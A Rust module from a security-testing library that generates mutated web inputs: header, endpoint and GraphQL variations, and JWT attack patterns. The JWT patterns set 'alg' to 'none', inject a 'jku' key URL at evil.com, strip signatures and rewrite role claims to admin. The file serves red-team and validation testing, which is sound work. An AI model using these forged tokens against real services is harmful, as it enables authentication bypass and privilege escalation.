use crate::rng::SimpleRng;
use crate::transformations::case::case_swap;
use crate::transformations::encoding::url_encode;

/// Generates HTTP header value variations for Caido and web security testing.
///
/// Useful for testing header parsing and WAF rules in tools like Caido.
///
/// # Examples
///
/// ```
/// use redstr::http_header_variation;
/// let header = "application/json";
/// let result = http_header_variation(header);
/// assert!(result.len() > 0);
/// ```
pub fn http_header_variation(input: &str) -> String {
    let mut rng = SimpleRng::new();

    // Common header value variations
    if input.contains("application/json") {
        let variants = [
            "application/json",
            "application/json; charset=utf-8",
            "application/json;charset=utf-8",
            "application/json; charset=UTF-8",
            "Application/JSON",
        ];
        variants[rng.next() as usize % variants.len()].to_string()
    } else if input.contains("text/html") {
        let variants = [
            "text/html",
            "text/html; charset=utf-8",
            "text/html;charset=utf-8",
            "text/html; charset=UTF-8",
            "Text/HTML",
        ];
        variants[rng.next() as usize % variants.len()].to_string()
    } else {
        // Apply case and whitespace variations
        let result = case_swap(input);
        if rng.next() % 2 == 0 {
            result.replace(" ", "").replace(";", "; ")
        } else {
            result
        }
    }
}

/// Generates API endpoint variations for Caido and API security testing.
///
/// Useful for testing API routing and parameter parsing.
///
/// # Examples
///
/// ```
/// use redstr::api_endpoint_variation;
/// let endpoint = "/api/v1/users";
/// let result = api_endpoint_variation(endpoint);
/// // Result should contain the endpoint in some form (case may vary)
/// assert!(result.to_lowercase().contains("api"));
/// ```
pub fn api_endpoint_variation(endpoint: &str) -> String {
    let mut rng = SimpleRng::new();

    let mut result = endpoint.to_string();

    // Add variations
    match rng.next() % 4 {
        0 => {
            // Add trailing slash
            if !result.ends_with('/') {
                result.push('/');
            }
        }
        1 => {
            // Remove trailing slash
            result = result.trim_end_matches('/').to_string();
        }
        2 => {
            // Case variation
            result = case_swap(&result);
        }
        _ => {
            // Add double slashes (common mistake)
            result = result.replace("/", "//").replace("//", "/");
            if result.starts_with("//") {
                result = result[1..].to_string();
            }
        }
    }

    result
}

/// Generates GraphQL query obfuscation for API security testing.
///
/// Useful for Caido and GraphQL security testing tools.
///
/// # Examples
///
/// ```
/// use redstr::graphql_obfuscate;
/// let query = "{ users { name } }";
/// let result = graphql_obfuscate(query);
/// assert!(result.len() > 0);
/// ```
pub fn graphql_obfuscate(query: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = String::new();

    for c in query.chars() {
        match c {
            ' ' => {
                // Vary whitespace
                match rng.next() % 3 {
                    0 => result.push(' '),
                    1 => result.push_str("  "), // Double space
                    _ => result.push('\t'),     // Tab
                }
            }
            '{' | '}' => {
                // Sometimes add spaces, sometimes not
                if rng.next() % 2 == 0 {
                    result.push(c);
                } else {
                    result.push(c);
                    if rng.next() % 2 == 0 {
                        result.push(' ');
                    }
                }
            }
            _ => {
                // Case variation for field names
                if c.is_alphabetic() && rng.next() % 4 == 0 {
                    if c.is_uppercase() {
                        result.push_str(&c.to_lowercase().to_string());
                    } else {
                        result.push_str(&c.to_uppercase().to_string());
                    }
                } else {
                    result.push(c);
                }
            }
        }
    }

    result
}

/// Generates session token variations for authentication bypass testing.
///
/// Useful for Caido and web security testing tools.
///
/// # Examples
///
/// ```
/// use redstr::session_token_variation;
/// let token = "abc123xyz";
/// let result = session_token_variation(token);
/// assert!(result.len() > 0);
/// ```
pub fn session_token_variation(token: &str) -> String {
    let mut rng = SimpleRng::new();

    // Common session token manipulation techniques
    match rng.next() % 4 {
        0 => {
            // Case variation
            case_swap(token)
        }
        1 => {
            // Add padding
            format!("{}{}", token, "=".repeat((rng.next() % 3) as usize))
        }
        2 => {
            // URL encode
            url_encode(token)
        }
        _ => {
            // Base64-like padding manipulation
            if token.ends_with('=') {
                token.trim_end_matches('=').to_string()
            } else {
                format!("{}=", token)
            }
        }
    }
}

/// Generates GraphQL variable injection patterns for GraphQL injection testing.
///
/// Useful for red team GraphQL injection testing and blue team input validation.
///
/// # Examples
///
/// ```
/// use redstr::graphql_variable_injection;
/// let query = "query($id: ID!) { user(id: $id) { name } }";
/// let result = graphql_variable_injection(query);
/// assert!(result.len() > 0);
/// ```
pub fn graphql_variable_injection(query: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = query.to_string();

    // Common GraphQL variable injection patterns
    let injections = [
        "$id: ID!",
        "$id: ID",
        "$id: String!",
        "$id: Int!",
        "$id: Float!",
        "$id: Boolean!",
        "$id: [ID!]",
        "$id: [String!]",
    ];

    // Try to inject variables in common patterns
    if result.contains("$id") {
        match rng.next() % 3 {
            0 => {
                // Add null variable
                result = result.replace("$id", "$id: null");
            }
            1 => {
                // Add empty string variable
                result = result.replace("$id", "$id: \"\"");
            }
            _ => {
                // Add array variable
                result = result.replace("$id", "$id: []");
            }
        }
    } else if result.contains("query") || result.contains("mutation") {
        // Inject variable declaration
        let injection = injections[rng.next() as usize % injections.len()];
        if result.contains('{') {
            result = result.replace("{", &format!("({}) {{", injection));
        }
    }

    result
}

/// Generates GraphQL introspection bypass patterns for security testing.
///
/// Useful for red team GraphQL security testing and blue team introspection protection validation.
///
/// # Examples
///
/// ```
/// use redstr::graphql_introspection_bypass;
/// let query = "{ __schema { types { name } } }";
/// let result = graphql_introspection_bypass(query);
/// assert!(result.len() > 0);
/// ```
pub fn graphql_introspection_bypass(query: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = query.to_string();

    // Common introspection bypass techniques
    let bypass_patterns = [
        ("__schema", "__Schema"),
        ("__type", "__Type"),
        ("__typename", "__typename"),
        ("__schema", "__schema"),
        ("__type", "__type"),
    ];

    // Apply bypass patterns
    for (original, replacement) in bypass_patterns.iter() {
        if result.contains(original) {
            match rng.next() % 4 {
                0 => {
                    // Case variation
                    result = result.replace(original, replacement);
                }
                1 => {
                    // Add aliases
                    result = result.replace(original, &format!("alias: {}", original));
                }
                2 => {
                    // Fragment spread
                    result = result.replace(original, &format!("... on {}", original));
                }
                _ => {
                    // Keep original but add whitespace
                    result = result.replace(original, &format!("{} ", original));
                }
            }
            break;
        }
    }

    // Add comment-based bypass
    if rng.next() % 2 == 0 {
        result = result.replace("{", "{# comment #");
    }

    result
}

/// Generates JWT header manipulation patterns for JWT security testing.
///
/// Useful for red team JWT token manipulation and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_header_manipulation;
/// let header = r#"{"alg":"HS256","typ":"JWT"}"#;
/// let result = jwt_header_manipulation(header);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_header_manipulation(header: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = header.to_string();

    // Common JWT header manipulation techniques
    match rng.next() % 5 {
        0 => {
            // Change algorithm to none
            result = result.replace("HS256", "none");
            result = result.replace("RS256", "none");
            result = result.replace("ES256", "none");
        }
        1 => {
            // Remove typ field
            result = result.replace(r#""typ":"JWT","#, "");
            result = result.replace(r#","typ":"JWT""#, "");
        }
        2 => {
            // Add jku (JSON Key URL) field
            result = result.replace("{", r#"{"jku":"http://evil.com/key.json","#);
        }
        3 => {
            // Add jwk (JSON Web Key) field
            result = result.replace("{", r#"{"jwk":{"kty":"RSA","n":"..."},"#);
        }
        _ => {
            // Case variation
            result = case_swap(&result);
        }
    }

    result
}

/// Generates JWT payload obfuscation patterns for JWT security testing.
///
/// Useful for red team JWT token manipulation and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_payload_obfuscate;
/// let payload = r#"{"sub":"user123","role":"admin"}"#;
/// let result = jwt_payload_obfuscate(payload);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_payload_obfuscate(payload: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = payload.to_string();

    // Common JWT payload obfuscation techniques
    match rng.next() % 4 {
        0 => {
            // Add extra fields
            result = result.replace("{", r#"{"extra":"value","#);
        }
        1 => {
            // Modify role claims
            result = result.replace(r#""role":"user""#, r#""role":"admin""#);
            result = result.replace(r#""role":"guest""#, r#""role":"admin""#);
        }
        2 => {
            // Add nested objects
            result = result.replace(r#""sub":"#, r#""sub":{"id":"#);
            if !result.contains("}") {
                result.push('}');
            }
        }
        _ => {
            // URL encode parts
            if let Some(start) = result.find(':') {
                let (before, after) = result.split_at(start + 1);
                result = format!("{}{}", before, url_encode(after));
            }
        }
    }

    result
}

/// Generates JWT algorithm confusion patterns for JWT security testing.
///
/// Useful for red team JWT algorithm confusion attacks and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_algorithm_confusion;
/// let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
/// let result = jwt_algorithm_confusion(token);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_algorithm_confusion(token: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = token.to_string();

    // Common algorithm confusion patterns
    let algorithms = ["HS256", "RS256", "ES256", "none", "HS384", "HS512"];

    // Replace algorithm in token (simplified - real implementation would decode/encode)
    for alg in algorithms.iter() {
        if result.contains(alg) {
            let new_alg = algorithms[rng.next() as usize % algorithms.len()];
            result = result.replace(alg, new_alg);
            break;
        }
    }

    // If no algorithm found, try to inject
    if !result.contains("alg") {
        let alg = algorithms[rng.next() as usize % algorithms.len()];
        // This is a simplified version - real JWT manipulation requires base64 decode/encode
        result = format!("{}.{}.", alg, result);
    }

    result
}

/// Generates JWT signature bypass patterns for JWT security testing.
///
/// Useful for red team JWT signature bypass attempts and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_signature_bypass;
/// let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
/// let result = jwt_signature_bypass(token);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_signature_bypass(token: &str) -> String {
    let mut rng = SimpleRng::new();
    let parts: Vec<&str> = token.split('.').collect();

    if parts.len() >= 3 {
        // Remove or modify signature
        match rng.next() % 4 {
            0 => {
                // Remove signature entirely
                format!("{}.{}.", parts[0], parts[1])
            }
            1 => {
                // Empty signature
                format!("{}.{}.", parts[0], parts[1])
            }
            2 => {
                // Truncated signature
                if !parts[2].is_empty() {
                    let truncated = &parts[2][..parts[2].len().saturating_sub(1)];
                    format!("{}.{}.{}", parts[0], parts[1], truncated)
                } else {
                    token.to_string()
                }
            }
            _ => {
                // Modified signature (simplified)
                format!("{}.{}.modified", parts[0], parts[1])
            }
        }
    } else {
        token.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_http_header_variation() {
        let header = "application/json";
        let result = http_header_variation(header);
        assert!(!result.is_empty());
        // Should contain application or json (case may vary)
        assert!(
            result.to_lowercase().contains("application") || result.to_lowercase().contains("json")
        );
    }

    #[test]
    fn test_api_endpoint_variation() {
        let endpoint = "/api/v1/users";
        let result = api_endpoint_variation(endpoint);
        assert!(result.to_lowercase().contains("api"));
    }

    #[test]
    fn test_graphql_obfuscate() {
        let query = "{ users { name } }";
        let result = graphql_obfuscate(query);
        assert!(result.to_lowercase().contains("users"));
    }

    #[test]
    fn test_session_token_variation() {
        let token = "abc123xyz";
        let result = session_token_variation(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_variable_injection() {
        let query = "query($id: ID!) { user(id: $id) { name } }";
        let result = graphql_variable_injection(query);
        assert!(!result.is_empty());
        assert!(result.contains("user") || result.contains("query"));
    }

    #[test]
    fn test_graphql_introspection_bypass() {
        let query = "{ __schema { types { name } } }";
        let result = graphql_introspection_bypass(query);
        assert!(!result.is_empty());
        assert!(result.contains("schema") || result.contains("__"));
    }

    #[test]
    fn test_jwt_header_manipulation() {
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate() {
        let payload = r#"{"sub":"user123","role":"admin"}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_signature_bypass() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let result = jwt_signature_bypass(token);
        assert!(!result.is_empty());
        // Should contain at least the first two parts
        assert!(result.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"));
    }
}
